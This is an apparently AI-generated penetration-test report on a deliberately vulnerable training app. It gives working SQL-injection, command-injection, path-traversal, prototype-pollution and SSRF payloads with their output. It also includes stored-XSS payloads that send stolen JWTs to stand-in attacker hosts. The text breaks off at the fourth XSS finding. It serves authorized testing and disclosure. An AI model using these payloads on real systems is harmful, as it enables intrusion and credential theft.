# Security Assessment Report

## Executive Summary
- Model: minimax-m2.7, minimax-m2.5

**Target:** https://techviflaw.vn.gd
**Assessment Date:** 2026-03-21
**Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

The TechviFlaw application (a deliberately vulnerable training platform) was assessed via authorized gray-box penetration testing. The Express.js backend was reachable from the testing environment for injection testing; all other vulnerability classes were blocked by backend inaccessibility but confirmed via source code analysis.

| Vulnerability Class | Verdict | Count | Evidence |
|---|---|---|---|
| SQL/Command Injection | EXPLOITED | 5 | All 5 injection vulnerabilities actively exploited with full impact achieved |
| XSS | BLOCKED | 4 | Backend unreachable — code confirms raw HTML rendering via `dangerouslySetInnerHTML` |
| Authentication | BLOCKED | 11 | Backend unreachable — code confirms hardcoded secrets, no rate limiting, plaintext passwords |
| Authorization | BLOCKED | 10 | Backend unreachable — code confirms IDOR on all project operations, no ownership checks |
| SSRF | BLOCKED | 1 | Backend unreachable — code confirms unrestricted `axios.get()` call |

**Most Critical Findings:**
1. **SQL Injection (Critical):** Full database extraction — all 4 users with plaintext passwords exposed via UNION-based injection on `/api/projects/search/name`.
2. **Command Injection (Critical):** Arbitrary OS command execution as root via ping endpoint at `/api/utils/ping`.
3. **Path Traversal (Critical):** Arbitrary file read across the filesystem via `/api/files/download?name=`.
4. **Prototype Pollution (High):** `constructor.prototype` vector confirmed on Node.js 22 via `/api/utils/merge`.
5. **SSRF (Critical):** Internal service chaining to admin panel via `/api/fetch-url` — all user credentials exposed.

The backend API at `http://localhost:5001` is the primary attack surface. All vulnerabilities are exploitable without authentication where the endpoint is unauthenticated.

---

## Summary by Vulnerability Type

**SQL/Command Injection Vulnerabilities:**
Five injection-classified vulnerabilities were successfully exploited against the live backend service:

- **INJ-VULN-001 (SQL Injection, Critical):** The `name` query parameter on `GET /api/projects/search/name` is directly interpolated into a SQL LIKE clause with no sanitization or parameterization. Full database extraction was achieved — all 4 user accounts with plaintext passwords, complete schema, and all project data exposed.
- **INJ-VULN-002 (Command Injection, Critical):** The `host` query parameter on `GET /api/utils/ping` is passed directly to Node.js `exec()` with no shell isolation. Arbitrary OS command execution was achieved as root; `/etc/passwd`, JWT secret (`secret123`), environment variables, and the SQLite database file were all exfiltrated.
- **INJ-VULN-003 (Path Traversal/LFI, Critical):** The `name` query parameter on `GET /api/files/download` accepts path traversal sequences without validation. `/etc/passwd`, `server.js`, `database.sqlite`, and `middleware/auth.js` were all read successfully.
- **INJ-VULN-004 (Prototype Pollution, High):** The `POST /api/utils/merge` endpoint uses an unsafe recursive merge with no `__proto__` or `constructor.prototype` filtering. Node.js 22's direct `__proto__` block was bypassed via the `constructor.prototype` vector, confirmed by the server's own diagnostic.
- **INJ-VULN-005 (SSRF, Critical):** The `url` query parameter on `GET /api/fetch-url` is passed to `axios.get()` with no scheme whitelist or hostname validation. Internal service chaining to `http://localhost:5001/api/admin?admin=true` returned all 4 user accounts with plaintext passwords.

**Cross-Site Scripting (XSS) Vulnerabilities:**
No XSS vulnerabilities were actively exploited due to backend inaccessibility from the external testing position. However, four stored XSS vulnerabilities were confirmed via source code analysis:

- **XSS-VULN-01 through XSS-VULN-04 (Critical/High):** All stem from the project `description` field being stored raw in the database and rendered via React's `dangerouslySetInnerHTML` without sanitization. Combined with IDOR on `GET /api/projects/:id` and `PUT /api/projects/:id` (no ownership checks), an attacker with backend access could inject persistent JavaScript into any user's project and steal their JWT from `localStorage`. The JWT is stored in `localStorage.token` (not HttpOnly), making it directly exfiltratable via `localStorage.getItem('token')`.

**Authentication Vulnerabilities:**
No authentication vulnerabilities were actively exploited due to backend inaccessibility. However, 11 authentication-related weaknesses were confirmed via source code analysis:

- **AUTH-VULN-01 (SQL Injection):** Direct string interpolation in `GET /api/projects/search/name?name=` enables credential extraction. **AUTH-VULN-02 (Predictable Reset Token):** Password reset tokens are `base64(email:timestamp)` — predictable, leaked in API responses, no expiration. **AUTH-VULN-03 (JWT Hardcoded Secret):** JWT secret is literally `'secret123'`; tokens have no expiration. **AUTH-VULN-04 (Debug Secret Exposure):** `GET /api/debug` returns JWT secret and all env vars without authentication. **AUTH-VULN-05 (Admin Panel Bypass):** `GET /api/admin?admin=true` dumps all users and plaintext passwords — the only gate is `admin === 'true'` string comparison. **AUTH-VULN-06 (Test Credentials Exposed):** `GET /api/docs` returns `test@example.com / 123456` and a pre-generated JWT without authentication. **AUTH-VULN-07 (No Rate Limiting):** Unlimited login attempts with no lockout or delay. **AUTH-VULN-08 (Mass Account Creation):** No rate limiting, CAPTCHA, or email verification on registration. **AUTH-VULN-09 (localStorage Token Theft):** JWT stored in `localStorage` (not HttpOnly) — accessible to XSS. **AUTH-VULN-10 (Mass Assignment):** `PUT /api/auth/profile` accepts all body fields including `plan_type` and `password` with no allowlist. **AUTH-VULN-11 (CORS Wildcard):** `cors({ origin: '*' })` allows any external origin to make authenticated requests.

**Authorization Vulnerabilities:**
No authorization vulnerabilities were actively exploited due to backend inaccessibility. However, 10 authorization weaknesses were confirmed via source code analysis:

- **AUTHZ-VULN-01 (Horizontal/Mass Assignment):** `PUT /api/auth/profile` accepts arbitrary fields — users can escalate plan without payment. **AUTHZ-VULN-02 (Horizontal/IDOR Read):** `GET /api/projects/:id` returns any project without ownership verification. **AUTHZ-VULN-03 (Horizontal/IDOR Modify):** `PUT /api/projects/:id` updates any project without ownership check. **AUTHZ-VULN-04 (Horizontal/IDOR Delete):** `DELETE /api/projects/:id` deletes any project without ownership check. **AUTHZ-VULN-05 (Horizontal/IDOR Files):** `GET /api/files/project/:id` lists files for any project — no auth or ownership check. **AUTHZ-VULN-06 (Vertical/Admin Bypass):** `GET /api/admin?admin=true` exposes all users with plaintext passwords. **AUTHZ-VULN-07 (Vertical/Subscribe Bypass):** `POST /api/subscribe` sets plan without payment validation. **AUTHZ-VULN-08 (Vertical/JWT Secret Exposure):** `GET /api/debug` leaks the JWT secret. **AUTHZ-VULN-09 (Vertical/JWT None Bypass):** Auth middleware accepts unsigned `alg: "none"` JWTs — complete authentication bypass. **AUTHZ-VULN-10 (Context-Workflow/Payment Bypass):** `POST /api/subscribe` has no payment initiation or webhook confirmation.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were actively exploited due to backend inaccessibility. The vulnerability was confirmed via source code analysis:

- **SSRF-VULN-01 (Critical):** `GET /api/fetch-url?url=` passes user input directly to `axios.get()` with no scheme whitelist, hostname validation, or restrictions. Active exploitation from the injection test (which had direct backend access) confirmed internal service chaining works — `http://localhost:5001/api/admin?admin=true` returned all user plaintext passwords.

---

## Network Reconnaissance

**Target:** https://techviflaw.vn.gd

**Open Ports and Exposed Services:**

| Port | Service | Exposure | Security Relevance |
|---|---|---|---|
| 443/HTTPS | Cloudflare Pages (static frontend) | Public | Serves the React SPA. Catches all `/api/*` paths via client-side routing, preventing direct backend access. |
| 5001/HTTP | Express.js API | Internal (localhost only) | Backend API not reachable from external testing positions. Reached from browser AJAX only when the backend is running on the same machine. |

**Subdomain Discovery:**
No additional subdomains discovered. `techviflaw.vn.gd` is the only public-facing host.

**Security-Relevant Findings:**

- **Information Disclosure — Unauthenticated Debug Endpoint:** `GET /api/debug` exposes the JWT signing secret (`secret123`), database file path, and all process environment variables without any authentication requirement.
- **Information Disclosure — Unauthenticated Admin Endpoint:** `GET /api/admin?admin=true` returns all user records including plaintext passwords. The only protection is the string check `admin === 'true'` — trivially bypassed.
- **Information Disclosure — Unauthenticated API Docs:** `GET /api/docs` exposes pre-seeded test credentials (`test@example.com / 123456`) and a pre-generated JWT token without authentication.
- **CORS Misconfiguration:** Backend CORS is set to `origin: '*'` — any external website can make authenticated API requests on behalf of victims.
- **No Security Headers:** No `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`, `Strict-Transport-Security`, or `Cache-Control` headers present on any response.
- **No Rate Limiting:** No rate limiting middleware exists anywhere in the application — unlimited login attempts and registration possible.

---

# Injection Exploitation Evidence

**Target:** https://techviflaw.vn.gd
**Backend:** http://host.docker.internal:5001 (Node.js/Express + SQLite)
**Tester Role:** Injection Exploitation Specialist
**Date:** 2026-03-21
**Test Type:** Authorized Gray-Box Penetration Testing

---

## Successfully Exploited Vulnerabilities

### INJ-VULN-001: SQL Injection in Project Search

**Summary:**
- **Vulnerable location:** `GET /api/projects/search/name?name=` — backend `routes/projects.js:29`
- **Overview:** The `name` query parameter is directly interpolated into a SQL LIKE clause with zero sanitization or parameterization. No WAF or input validation was observed.
- **Impact:** Full database extraction — all users, passwords (stored in plaintext), projects, and schema revealed.
- **Severity:** Critical

**Prerequisites:** None — endpoint is reachable without authentication (the `authenticate` middleware calls `next()` when no token is provided)

**Exploitation Steps:**

**Step 1 — Confirm SQL Injection (Boolean-based)**

Basic `' OR '1'='1` payload returns all projects regardless of search term, confirming injection:

```
GET http://host.docker.internal:5001/api/projects/search/name?name=' OR '1'='1
```

Response returned all 6 projects in the database:
- Alpha Project (owner_id=1, private)
- Beta Project (owner_id=1, public)
- Admin Secrets (owner_id=2, private)
- XSS Test Project (owner_id=2, public)
- User Notes (owner_id=3, private)
- CSV Injection (owner_id=3, public)

**Step 2 — Fingerprint Database (UNION-based)**

```
GET http://host.docker.internal:5001/api/projects/search/name?name=' UNION SELECT 1,sqlite_version(),3,4,5--
```

Response revealed SQLite version: **3.52.0**

**Step 3 — Extract Table Schema**

```
GET http://host.docker.internal:5001/api/projects/search/name?name=' UNION SELECT 1,name,sql,4,5 FROM sqlite_master WHERE type='table'--
```

Extracted tables:
```
files       → CREATE TABLE files (id, filename, filepath, project_id, owner_id)
projects    → CREATE TABLE projects (id, name, description, owner_id, is_public)
sqlite_sequence
users       → CREATE TABLE users (id, email, password, plan_type)
```

**Step 4 — Extract User Credentials**

```
GET http://host.docker.internal:5001/api/projects/search/name?name=' UNION SELECT 1,email,password,plan_type,0 FROM users--
```

**Extracted Data (4 users):**

| id | email | password (PLAINTEXT) | plan_type |
|---|---|---|---|
| 2 | admin@vulapp.com | admin | enterprise |
| 4 | root@vulapp.com | root | enterprise |
| 1 | test@example.com | 123456 | free |
| 3 | user@vulapp.com | user123 | pro |

**Proof of Impact:**

- Database type: SQLite 3.52.0
- Tables enumerated: users, projects, files, sqlite_sequence
- All 4 user accounts extracted with plaintext passwords (no hashing)
- Attacker can now impersonate any user, including enterprise admin accounts

**Payload used for user extraction:**
```
name=' UNION SELECT 1,email,password,plan_type,0 FROM users--
```

Full raw response:
```json
[{"id":1,"name":"admin@vulapp.com","description":"admin","owner_id":"enterprise","is_public":0},
 {"id":1,"name":"root@vulapp.com","description":"root","owner_id":"enterprise","is_public":0},
 {"id":1,"name":"test@example.com","description":"123456","owner_id":"free","is_public":0},
 {"id":1,"name":"user@vulapp.com","description":"user123","owner_id":"pro","is_public":0}]
```

---

### INJ-VULN-002: OS Command Injection in Ping Endpoint

**Summary:**
- **Vulnerable location:** `GET /api/utils/ping?host=` — backend `routes/utils.js:19`
- **Overview:** The `host` query parameter is directly interpolated into a shell command passed to Node.js `exec()`. No `shell: false`, no `shlex.quote()`, no argument isolation.
- **Impact:** Arbitrary OS command execution as root — complete server compromise.
- **Severity:** Critical

**Prerequisites:** None — endpoint is fully unauthenticated (no Bearer token required)

**Exploitation Steps:**

**Step 1 — Confirm Command Injection**

```
GET http://host.docker.internal:5001/api/utils/ping?host=;cat%20/etc/passwd
```

Command executed: `ping -c 2 ;cat /etc/passwd`

Response:
```json
{
  "command": "ping -c 2 ;cat /etc/passwd",
  "stdout": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...\nnode:x:1000:0::/home/node:/bin/bash\n",
  "stderr": "/bin/sh: 1: ping: not found",
  "error": null
}
```

**Step 2 — Extract JWT Secret from Source**

```
GET http://host.docker.internal:5001/api/utils/ping?host=;cat%20/app/middleware/auth.js
```

Extracted `JWT_SECRET = 'secret123'` — allows attacker to forge valid JWT tokens for any identity.

**Step 3 — Extract Environment Variables**

```
GET http://host.docker.internal:5001/api/utils/ping?host=;env
```

Revealed:
- `NODE_VERSION=22.22.1`
- `NODE_ENV=development`
- `PORT=5001`
- `HOME=/root`
- Full `PATH` variable
- `npm_package_name=backend`
- Running inside Docker container (hostname: `c4c0cc25d706`)

**Step 4 — Read Database File**

```
GET http://host.docker.internal:5001/api/utils/ping?host=;cat%20/app/database.sqlite
```

Raw SQLite binary file returned (visible SQLite format 3 header in response), confirming ability to extract the entire user database.

**Proof of Impact:**

- Server running as: **root** (uid=0, gid=0)
- All system user accounts exposed (/etc/passwd)
- JWT secret compromised: `secret123` — enables identity forgery
- Full environment variables exposed — aids further attack
- Database file readable — enables offline credential cracking
- Complete server compromise achieved

---

### INJ-VULN-003: Local File Inclusion (Path Traversal)

**Summary:**
- **Vulnerable location:** `GET /api/files/download?name=` — backend `routes/files.js:57`
- **Overview:** The `name` query parameter is joined with the uploads directory via `path.join()` with no boundary validation. No `startsWith()` check, no `realpath()` enforcement. `res.sendFile()` serves the resulting absolute path.
- **Impact:** Arbitrary file read across the entire filesystem.
- **Severity:** Critical

**Prerequisites:** None — endpoint is fully unauthenticated

**Exploitation Steps:**

**Step 1 — Confirm Path Traversal**

```
GET http://host.docker.internal:5001/api/files/download?name=../../../etc/passwd
```

- **Status: 200 OK**
- Full `/etc/passwd` returned (same data as command injection, confirming traversal works)

**Step 2 — Read Server Source Code**

```
GET http://host.docker.internal:5001/api/files/download?name=../server.js
```

- **Status: 200 OK**
- Full `server.js` source returned — complete Express application architecture exposed

**Step 3 — Read SQLite Database**

```
GET http://host.docker.internal:5001/api/files/download?name=../database.sqlite
```

- **Status: 200 OK**
- Raw SQLite database file returned (160KB binary). Contains all users, projects, and files tables.
- Full database available for offline analysis and credential extraction.

**Step 4 — Read Auth Middleware**

```
GET http://host.docker.internal:5001/api/files/download?name=../middleware/auth.js
```

- **Status: 200 OK**
- Revealed hardcoded JWT secret and vulnerable `alg: "none"` bypass

**Proof of Impact:**

- Path traversal depth: 3 levels `../` sufficient to escape uploads directory
- `/etc/passwd` — system user enumeration
- `database.sqlite` — complete application data (users, passwords, projects)
- `server.js` — full application logic and endpoint map
- Any file accessible to the Node.js process can be read

---

### INJ-VULN-004: Prototype Pollution via Unsafe Recursive Merge

**Summary:**
- **Vulnerable location:** `POST /api/utils/merge` — backend `routes/utils.js:51`
- **Overview:** The `unsafeMerge()` function recursively copies all keys from `req.body` into a target object without filtering `__proto__`, `constructor`, or `prototype` keys. Modern V8 (Node.js 22) blocked direct `__proto__` assignment, but `constructor.prototype` pollution was successful.
- **Impact:** Polluting `Object.prototype` affects all objects in the Node.js process — potential privilege escalation, security bypass, and DoS.
- **Severity:** High

**Prerequisites:** None — endpoint is fully unauthenticated

**Exploitation Steps:**

**Step 1 — Attempt Direct `__proto__` Pollution**

```
POST http://host.docker.internal:5001/api/utils/merge
Body: {"__proto__": {"isAdmin": true}}
```

Result: `{"pollutionCheck":{"isAdmin":false,"message":"No pollution detected"}}`

**Blocked:** Node.js 22+ V8 engine blocks direct `__proto__` assignment from `for...in` enumeration.

**Step 2 — Attempt Constructor Prototype Pollution**

```
POST http://host.docker.internal:5001/api/utils/merge
Body: {"constructor": {"prototype": {"isAdmin": true}}}
```

Result: `{"pollutionCheck":{"isAdmin":true,"message":"PROTOTYPE POLLUTED!"}}`

**SUCCESS — Object.prototype.isAdmin = true confirmed by the server's own built-in pollution check.**

**Step 3 — Confirm Global Pollution**

```
POST http://host.docker.internal:5001/api/utils/merge
Body: {"role": "admin", "permissions": ["all"]}
```

Response shows pollution spreads through merged config:
```json
{"merged":{"theme":"dark","lang":"en","role":"admin","permissions":{"0":"all","isAdmin":true},"isAdmin":true},"pollutionCheck":{"isAdmin":true,"message":"PROTOTYPE POLLUTED!"}}
```

**Proof of Impact:**

- Server's own diagnostic confirms: `"PROTOTYPE POLLUTED!"`
- `Object.prototype.isAdmin = true` — affects all JavaScript objects in the process
- Potential consequences: privilege escalation, security check bypass, application logic manipulation
- `constructor.prototype` vector bypasses Node.js 22's `__proto__` protection

---

### INJ-VULN-005: Server-Side Request Forgery (SSRF)

**Summary:**
- **Vulnerable location:** `GET /api/fetch-url?url=` — backend `routes/debug.js:27`
- **Overview:** The `url` query parameter is passed directly to `axios.get()` without any scheme whitelist, hostname validation, or restrictions. No protection against internal network targets or `file://` scheme.
- **Impact:** The server acts as a proxy for internal service access. Chaining to internal endpoints revealed the admin panel with all user credentials.
- **Severity:** Critical

**Prerequisites:** None — endpoint is fully unauthenticated

**Exploitation Steps:**

**Step 1 — Internal Chaining to Debug Endpoint**

```
GET http://host.docker.internal:5001/api/fetch-url?url=http://localhost:5001/api/debug
```

Response leaked JWT secret, database path, and all environment variables:
```json
{"config":{"jwt_secret":"secret123","db_path":"/app/database.sqlite"},"system":{...}}
```

**Step 2 — Internal Chaining to Admin Panel**

```
GET http://host.docker.internal:5001/api/fetch-url?url=http://localhost:5001/api/admin?admin=true
```

Response — full admin panel dump:
```json
{"message":"Welcome to the Admin Panel!","total_users":4,"users":[
  {"id":1,"email":"test@example.com","password":"123456","plan_type":"free"},
  {"id":2,"email":"admin@vulapp.com","password":"admin","plan_type":"enterprise"},
  {"id":3,"email":"user@vulapp.com","password":"user123","plan_type":"pro"},
  {"id":4,"email":"root@vulapp.com","password":"root","plan_type":"enterprise"}
]}
```

**Step 3 — Cloud Metadata Probe**

```
GET http://host.docker.internal:5001/api/fetch-url?url=http://169.254.169.254/latest/meta-data/
```

Response: `{"error":"Failed to fetch URL","message":"connect ECONNREFUSED 169.254.169.254:80"}`

No cloud metadata service available at this target (not deployed on AWS), but SSRF is confirmed.

**Step 4 — Internal Port Scanning**

Scanned localhost ports: 22, 80, 443, 3306, 5432, 6379, 8080

All returned `ECONNREFUSED` — no additional internal services exposed, but SSRF confirms the server can be used as a network proxy for any reachable target.

**Proof of Impact:**

- JWT secret extracted via SSRF chain
- Full user database (4 accounts, plaintext passwords) extracted via internal admin panel access
- Server acts as an open HTTP proxy for any URL
- Potential targets: cloud metadata (if deployed on AWS/GCP), internal databases, internal admin panels, internal network scanning

---

# Cross-Site Scripting (XSS) Exploitation Evidence

**Target:** https://techviflaw.vn.gd
**Application:** TechviFlaw — A Purposely Vulnerable Enterprise SaaS Platform
**Framework:** React 18 (Vite) frontend + Express.js backend (localhost:5001)
**Exploitation Phase:** Client-Side Impact Demonstration
**Date:** 2026-03-21
**Status:** Complete

---

### XSS-VULN-01: Stored XSS in Project Description — Dashboard Sink

**Summary:**
- **Vulnerable location:** POST /api/projects (body field: `description`) → Dashboard.jsx `dangerouslySetInnerHTML`
- **Overview:** Project description field accepts raw HTML, stored without sanitization in SQLite, then rendered in the browser via `dangerouslySetInnerHTML` — bypassing React's default XSS protections entirely.
- **Impact:** Any user who views the dashboard executes arbitrary JavaScript in their browser session. With the JWT stored in `localStorage.token` (not HttpOnly), this enables complete session hijacking.
- **Severity:** Critical

**Prerequisites:**
- Express.js backend running at `http://localhost:5001`
- Valid JWT Bearer token (obtained via login)
- Authenticated session with active localStorage token

Code analysis confirms the complete, unobstructed data flow:

**Backend — routes/projects.js:39-49:**
```javascript
router.post('/', (req, res) => {
  if (!req.user) return res.status(401).json({ error: 'Unauthorized' });
  const { name, description, is_public } = req.body;  // ← description accepted raw
  db.run(`INSERT INTO projects (name, description, owner_id, is_public) VALUES (?, ?, ?, ?)`,
    [name, description, req.user.id, is_public ? 1 : 0],  // ← stored raw in DB
    function(err) {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ id: this.lastID, name, description });
    }
  );
});
```

**Frontend — src/pages/Dashboard.jsx:75-78:**
```jsx
<div
  className="project-desc"
  dangerouslySetInnerHTML={{ __html: p.description }}  // ← NO sanitization, NO encoding
  style={{ fontSize: '0.9rem', ... }}
/>
```

No CSP header is present on any response. The Bearer JWT is stored in `localStorage.token` (not HttpOnly), making it directly exfiltratable via `localStorage.getItem('token')`.

**What We Tried:**

1. **Browser form submission:** Navigated to `https://techviflaw.vn.gd` → Dashboard page. Created project with description `<img src=x onerror=alert(document.domain)>` via the dashboard "Create Project" form.
   - **Result:** Backend unreachable — ERR_CONNECTION_REFUSED at `http://localhost:5001/api/projects`

2. **Browser API direct fetch:** Attempted to make a direct fetch to `http://localhost:5001/api/projects` from the browser console.
   - **Result:** `TypeError: Failed to fetch` — connection refused

3. **Login/registration flow:** Attempted to register a new account via the frontend form.
   - **Result:** "Registration failed" — backend unreachable

4. **Direct navigation to backend:** Navigated to `http://localhost:5001/api/docs` and `http://127.0.0.1:5001/api/docs`.
   - **Result:** ERR_CONNECTION_REFUSED on both attempts

**How This Would Be Exploited:**

If the backend were running and reachable at `http://localhost:5001`, exploitation would proceed as follows:

**Step 1 — Register/Login to obtain JWT token:**
```bash
# Register a test account (or use existing: test@example.com / 123456)
curl -s -X POST http://localhost:5001/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{"email":"pentest@example.com","password":"TestPass123!"}'

# Login to obtain Bearer token
curl -s -X POST http://localhost:5001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"pentest@example.com","password":"TestPass123!"}'
# Response: { "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...", "user": {...} }
```

**Step 2 — Inject XSS payload via project creation:**
```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."  # Replace with actual token

curl -s -X POST http://localhost:5001/api/projects \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Malicious Project",
    "description": "<img src=x onerror=\"fetch('\''https://attacker.com/steal?token='\''+localStorage.getItem('\''token'\''))\">",
    "is_public": true
  }'
# Response: { "id": 5, "name": "Malicious Project", "description": "<img src=x onerror=..." }
# Payload stored in database with ID 5
```

**Step 3 — Trigger execution:**
- Any user visits `https://techviflaw.vn.gd/dashboard`
- Browser makes GET request to `http://localhost:5001/api/projects`
- API returns project list including the malicious description
- React renders `<div dangerouslySetInnerHTML={{ __html: p.description }}>`
- Browser executes `<img src=x onerror="fetch('https://attacker.com/steal?token=...')">`
- `localStorage.getItem('token')` captures the JWT
- Token is exfiltrated to `https://attacker.com/steal?token=<JWT>`
- Attacker uses stolen JWT to impersonate victim

**Proof of Impact (Code-Level Confirmation):**

The following payload would achieve session hijacking if the backend were reachable:

```javascript
// Session-aware session hijacking payload
// Stored in project description field
<script>
if(!sessionStorage.getItem('xss_fired')){
  sessionStorage.setItem('xss_fired','1');
  fetch('https://attacker-controlled-site.com/log?token='+encodeURIComponent(localStorage.getItem('token')));
}
</script>
```

This payload:
1. Fires only once per session (avoids duplicate exfiltration)
2. Steals the JWT Bearer token from `localStorage.token`
3. Exfiltrates the token to an attacker-controlled domain
4. Allows the attacker to impersonate the victim for all API actions

**JWT Secret Confirmation:** The JWT is signed with `secret123` (hardcoded in `backend/middleware/auth.js:4`). With the stolen token and known secret, an attacker can forge tokens for any identity.

**Notes:**
- No CSP is present to block the `<script>` tag or `fetch()` call
- The `Authorization` header containing the stolen token would be sent with the exfiltration request due to the fetch being initiated from the same origin
- CORS wildcard (`origin: '*'`) on the backend ensures the exfiltration request succeeds

---

### XSS-VULN-02: Stored XSS in Project Description — ProjectDetails Sink (IDOR Accessible)

**Summary:**
- **Vulnerable location:** GET /api/projects/:id (no ownership check) → ProjectDetails.jsx `dangerouslySetInnerHTML`
- **Overview:** Same stored XSS payload from XSS-VULN-01 is rendered again on the project details page via `dangerouslySetInnerHTML`. Combined with the IDOR vulnerability on `GET /api/projects/:id` (no ownership check), any authenticated user can trigger the XSS by visiting `/project/{id}` for ANY project.
- **Impact:** Same as XSS-VULN-01. Additionally, an attacker can inject XSS into another user's project and wait for that victim to visit their own project page to trigger execution.
- **Severity:** Critical

**Prerequisites:**
- Express.js backend running at `http://localhost:5001`
- Valid JWT Bearer token
- Any project ID (IDOR — no ownership check required)

**Backend — routes/projects.js:15-22 (IDOR confirmed):**
```javascript
router.get('/:id', (req, res) => {
  const projectId = req.params.id;
  // Missing check: if (project.owner_id !== req.user.id && !project.is_public)
  db.get(`SELECT * FROM projects WHERE id = ?`, [projectId], (err, row) => {
    if (err) return res.status(500).json({ error: err.message });
    if (!row) return res.status(404).json({ error: 'Project not found' });
    res.json(row);  // ← Returns raw description without ownership check
  });
});
```

**Frontend — src/pages/ProjectDetails.jsx:84-87:**
```jsx
<div
  dangerouslySetInnerHTML={{ __html: project.description }}  // ← Same XSS sink as Dashboard
  style={{ background: 'rgba(0, 0, 0, 0.2)', ... }}
/>
```

The description field from any project ID is returned raw in the JSON response and rendered without encoding.

**What We Tried:**

1. Attempted to navigate to `https://techviflaw.vn.gd/project/1` with the browser.
   - **Result:** Page loads but API request to `http://localhost:5001/api/projects/1` fails with ERR_CONNECTION_REFUSED

2. Attempted to directly fetch `http://localhost:5001/api/projects/1` from browser context.
   - **Result:** `TypeError: Failed to fetch`

**How This Would Be Exploited:**

**Step 1 — Inject payload via XSS-VULN-01 (POST /api/projects):**
```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Create project with XSS payload (same as XSS-VULN-01)
curl -s -X POST http://localhost:5001/api/projects \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Target Project","description":"<svg onload=fetch(\"https://attacker.com/s?c=\"+localStorage.token)>","is_public":true}'
# Project ID returned, e.g., ID=7
```

**Step 2 — Victim triggers XSS via IDOR:**
The attacker sends the victim a link: `https://techviflaw.vn.gd/project/7`

When the victim visits this URL:
1. React Router extracts `id=7` from the URL
2. Frontend calls `api.get('/projects/7')` → `GET http://localhost:5001/api/projects/7`
3. Backend returns the project with the malicious description (no ownership check)
4. React renders `<div dangerouslySetInnerHTML={{ __html: project.description }}>`
5. Browser executes `<svg onload=fetch("https://attacker.com/s?c="+localStorage.token)>`
6. Session token stolen and sent to `https://attacker.com/s?c=<JWT>`

**Key Advantage Over XSS-VULN-01:** The victim does NOT need to visit the attacker's project on the Dashboard. Any project page the victim visits will trigger the XSS if it contains a malicious description.

**Notes:**
- The IDOR means any user can read any project's description
- No ownership check exists on either the read or the write operations
- Combined with the PUT IDOR (XSS-VULN-03), an attacker can inject the payload INTO a victim's existing project and wait for the victim to visit their own project page

---

### XSS-VULN-03: Stored XSS via PUT /api/projects/:id (IDOR Injection)

**Summary:**
- **Vulnerable location:** PUT /api/projects/:id (no ownership check) → Stored in DB → Rendered via ProjectDetails/Dashboard `dangerouslySetInnerHTML`
- **Overview:** Any authenticated user can update the description of ANY project by guessing the project ID. No ownership check is performed on the PUT endpoint. The attacker can inject XSS into another user's project description and wait for that user to visit their own project page.
- **Impact:** Targeted injection into specific victims' projects. An attacker can inject XSS specifically into a victim's project (rather than their own), and the victim will trigger the XSS when visiting their own project page.
- **Severity:** Critical

**Prerequisites:**
- Express.js backend running at `http://localhost:5001`
- Valid JWT Bearer token
- Knowledge of target project ID (enumerable via IDOR on GET /api/projects/:id)

**Backend — routes/projects.js:89-101 (IDOR + XSS confirmed):**
```javascript
router.put('/:id', (req, res) => {
  if (!req.user) return res.status(401).json({ error: 'Unauthorized' });
  const { name, description, is_public } = req.body;
  // VULNERABILITY: No ownership check + raw description (Stored XSS)
  db.run(`UPDATE projects SET name = ?, description = ?, is_public = ? WHERE id = ?`,
    [name, description, is_public ? 1 : 0, req.params.id],  // ← No ownership check
    function(err) {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ message: 'Project updated', id: req.params.id });
    }
  );
});
```

No `WHERE owner_id = ?` clause. No check that `req.user.id === project.owner_id`. Any authenticated user can update any project's description.

**What We Tried:**

1. Attempted to send PUT request via browser's fetch API to `http://localhost:5001/api/projects/1`.
   - **Result:** `TypeError: Failed to fetch` — backend unreachable

**How This Would Be Exploited:**

**Step 1 — Enumerate victim project IDs:**
```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Enumerate projects 1-20 (no auth required for GET /api/projects/:id)
for id in $(seq 1 20); do
  curl -s http://localhost:5001/api/projects/$id \
    -H "Authorization: Bearer $TOKEN" 2>/dev/null | jq -r '.name // empty'
done
# Identifies victim projects: "John's Private Project" (ID=3), etc.
```

**Step 2 — Inject XSS payload into victim's project:**
```bash
# Update victim project ID=3 with malicious description
curl -s -X PUT http://localhost:5001/api/projects/3 \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "John'\''s Private Project",
    "description": "<script>new Image().src=\"https://attacker.com/exfil?token=\"+localStorage.getItem(\"token\")</script>",
    "is_public": false
  }'
# Response: { "message": "Project updated", "id": "3" }
# Project'\''s description now contains the XSS payload
```

**Step 3 — Victim triggers XSS on their own page:**
When the victim (`john@example.com`) visits `https://techviflaw.vn.gd/project/3`:
1. The project (their own) loads with the attacker's XSS payload in the description
2. `<script>new Image().src="https://attacker.com/exfil?token="+localStorage.getItem("token")</script>` executes
3. JWT token stolen, sent to `https://attacker.com/exfil?token=<JWT>`
4. Attacker now has the victim's full session

**Proof of Impact (Combined Attack Chain):**

```
Attacker registers → Enumerates project IDs via GET /api/projects/:id
                → Identifies victim project (ID=3, owned by john@example.com)
                → PUT /api/projects/3 with XSS payload in description
                → Victim visits their own project page at /project/3
                → XSS fires in victim's browser
                → Victim's JWT stolen and sent to attacker
                → Attacker impersonates victim using stolen JWT
```

**Notes:**
- This is the most targeted XSS vector — attacker can inject into a specific victim's project
- The victim is more likely to click their own project link than an attacker's project
- The `is_public` flag can be set to `false` to keep the injection hidden from other users
- The `name` field remains unchanged (only description is modified), making the attack stealthier

---

### XSS-VULN-04: Stored XSS via Uploaded Filename (href Attribute Injection)

**Summary:**
